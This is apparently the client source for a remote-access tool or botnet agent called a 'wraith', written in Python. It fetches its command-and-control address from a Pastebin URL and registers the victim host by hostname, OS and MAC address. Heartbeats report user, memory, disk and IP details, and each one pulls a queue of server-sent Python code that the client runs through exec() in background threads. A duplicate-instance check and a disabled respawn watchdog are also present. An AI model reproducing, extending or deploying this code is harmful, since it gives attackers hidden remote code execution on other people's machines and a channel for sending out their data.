#!/usr/bin/python3

# Import libraries
from aes import AesEncryption as aes  # From the same dir as this file
import requests
import threading
import json
import random
import psutil
import sys
import socket
import time
import platform
import shutil
import getpass
import os
import subprocess
from uuid import getnode as get_mac

# Get start time of this wraith
start_time = time.time()

# START CONSTANTS

# Define some constants
# The URL where the URL of the C&C server is found. This option was added
# to allow the C&C URL to change without having to re-install all wraiths
FETCH_SERVER_LOCATION_URL = "https://pastebin.com/raw/dAUvxiQb"
# A key used to encrypt the first packet before a new key is sent over by the
# server. Not the most secure communication, I know. Any replacement welcome.
# However, wraiths can work over SSL and so can the panel so the security
# of this system is not critical
CRYPT_KEY = "G39UHG83H2F92JC9H92VJ29W9HCG9WMHG2F1ZE10SKXQCSPKNXKZNBDCOG0Y"
# The fingerprint of the server to trust. This prevents the wraith from
# accidentally connecting and sending info to the wrong server if the
# URL is wrong
TRUSTED_SERVER = "VWIVWNODCOWQPSPL"
# Port used by the wraith on localhost to check if other wraiths are currently
# running. We don't want duplicates
NON_DUPLICATE_CHECK_PORT = 47402
# Whether to log the interactions with the server to the console.
# Not recommended except for debugging
INTERACTION_LOGGING = True

# END CONSTANTS

# Now, we fork :)
"""
while True:
    # This spawns a child process. The parent will monitor the child
    # and re-start it if it exits
    pid = os.fork()
    # If this is not the child process (is parent process), start monitoring
    # child and re-start it in case of failure
    if pid != 0:
        try:
            while True: psutil.Process(pid)
        except psutil.NoSuchProcess: continue
    # If this is the child process, exit the loop and continue
    else: break
"""

# Check if any other wraiths are active. If so, die. If not, bind
# to socket to tell all other wraiths we're active.
single_instance_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try: single_instance_socket.bind(("localhost", NON_DUPLICATE_CHECK_PORT))
except: sys.exit(0)

# Init crypt
aes = aes()

# Get the address of the wraith API
connect_url = requests.get(FETCH_SERVER_LOCATION_URL).text

# Create a class for the wraith
class Wraith(object):
    # When the wraith is created
    def __init__(self, api_url, CRYPT_KEY, crypt_obj):
        self.id = None # Will be replaced with server-assigned UUID on login
        self.api_url = api_url # Create a local copy of the API url
        self.CRYPT_KEY = CRYPT_KEY # Create a local copy of the encryption key
        self.crypt = crypt_obj # Create a local copy of the encryption object
        self.command_queue = [] # Create a queue of all the commands to run

        # Start the command running thread
        self.command_thread = threading.Thread(target=self.run_commands_thread)
        self.command_thread.start()

    # Make requests to the api and return responses
    def api(self, data_dict):
        # If we are meant to log interactions, log
        if INTERACTION_LOGGING: print("\n[CLIENT]:\n"+json.dumps(data_dict)+"\n")
        # Create the encrypted data string
        data = self.crypt.encrypt(json.dumps(data_dict), self.CRYPT_KEY).decode()
        # Generate a prefix for ID and security purposes
        prefix=("".join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for i in range(5)])+"Wr7H")
        # Send the data using a HTTP POST request and get the response (only text, don't need headers)
        try: response = requests.post(connect_url, data=prefix+data).text.encode()
        # If for some reason the request failed, return False
        except: return False
        # Attempt to decrypt the response with the crypt object and key
        response_is_crypt = True
        try: response = self.crypt.decrypt(response, self.CRYPT_KEY)
        # If this fails, the message must be unencrypted. Ignore the err and try to JSON decode
        except: response_is_crypt = False
        try:
            response = json.loads(response)
            # If we are meant to log, log
            if INTERACTION_LOGGING: print("\n[SERVER]:\n"+json.dumps(response)+"\nISCRYPT: {}\n".format(response_is_crypt))
            # If all worked out well, return the response as a dict. If something failed, return False
            return response
        except: return False

    # Get own local IP
    def get_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # Doesn't need to be reachable
            s.connect(('10.255.255.255', 1))
            IP = s.getsockname()[0]
        except: IP = '127.0.0.1'
        finally: s.close()
        return IP

    # Log in with the api
    def login(self):
        # Create the data we need to send
        data = {}
        data["message_type"] = "login"
        data["data"] = {
            "osname": socket.gethostname(),
            "ostype": platform.platform(),
            "macaddr": get_mac(),
        }
        # Send the request
        response = self.api(data)
        # Check the data received back
        if isinstance(response, type({})) and response["status"] == "SUCCESS":
            # If the server did not identify itself correctly, fail
            if response["server_id"] != TRUSTED_SERVER: return False
            # Save given ID as wraith ID. We'll identify ourselves with it from now on
            self.id = response["wraith_id"]
            # If we're told to switch encryption keys, switch
            if "switch_key" in response.keys():
                self.CRYPT_KEY = response["switch_key"]
            return True
        else: return False

    # Send a heartbeat to keep login alive and fetch commands
    def heartbeat(self):
        # Create a dict for data we need to send
        data = {}
        data["message_type"] = "heartbeat"
        data["data"] = { # Add some data for the server to record
            "info": {
                "running_as_user": getpass.getuser(),
                "available_ram": psutil.virtual_memory().free,
                "used_ram": psutil.virtual_memory().used,
                "available_disk": shutil.disk_usage("/")[2],
                "used_disk": shutil.disk_usage("/")[1],
                "local_ip": self.get_ip(),
            },
            "wraith_id": self.id,
        }
        # Send the request
        response = self.api(data)
        # Check the data received back
        if type(response) == type({}) and response["status"] == "SUCCESS" and "command_queue" in response.keys():
            # If the server did not identify itself correctly, fail
            if response["server_id"] != TRUSTED_SERVER: return False
            # Append commands to queue
            for command in response["command_queue"]:
                self.command_queue.append(command)
            # If we're told to switch encryption keys, switch
            if "switch_key" in response.keys():
                self.CRYPT_KEY = response["switch_key"]
            return True
        else: return False

    def putresult(self, status="SUCCESS", result="/No Data/"):
        # Create the data we need to send
        data = {}
        data["message_type"] = "putresults"
        data["data"] = {
            "cmdstatus": status,
            "result": result,
            "wraith_id": self.id,
        }
        # Send the request
        response = self.api(data)
        # Check the data received back
        if isinstance(response, type({})) and response["status"] == "SUCCESS":
            # If the server did not identify itself correctly, fail
            if response["server_id"] != TRUSTED_SERVER: return False
            # If we're told to switch encryption keys, switch
            if "switch_key" in response.keys():
                self.CRYPT_KEY = response["switch_key"]
            return True
        else: return False

    # Run all of the commands in the command_queue
    def run_commands(self):
        for cmd in self.command_queue:
            try:
                # Remove the command from the list
                self.command_queue.remove(cmd)
                # Define a scope for the exec call so the script_main function can be used later
                exec_scope = locals()
                # Define a script_main function to prevent errors in case of incorrectly formatted modules
                exec_scope["script_main"] = lambda a, b: 0
                # This should define the script_main function
                exec(cmd[1], globals(), exec_scope)
                # Define the script_main function as a thread
                script_thread = threading.Thread(target=exec_scope["script_main"], args=(
                    self,
                    cmd[0]
                ))
                # Notify the server that we are now executing the command
                self.putresult("SUCCESS", "Executing `{}`".format(cmd[0]))
                # Execute the command
                script_thread.start()
            except Exception as e:
                # If there was an error, report it to the server
                self.putresult("ERROR - {}".format(e), "Error while executing `{}`".format(cmd[0]))

    # Indefinitely run `run_commands`
    def run_commands_thread(self):
        while True: self.run_commands()

# Create an instance of wraith
wraith = Wraith(connect_url, CRYPT_KEY, aes)

# Start sending heartbeats
# It's ok not to login beforehand as heartbeat will fail and the wraith will
# log in when it does

# TODO retry timeout and restart
# TODO robust server error handling

while True:
    # If the heartbeat fails for some reason (implicitly execute heartbeat)
    if not wraith.heartbeat():
        # Switch to default key in case switch_key was applied
        wraith.CRYPT_KEY = CRYPT_KEY
        # Try login every 10 seconds until it works
        while not wraith.login(): time.sleep(10)
        # Continue to the next loop (re-send heartbeat)
        continue

    # Delay sending hearbeats to prevent DDoSing our own server
    time.sleep(3.2)
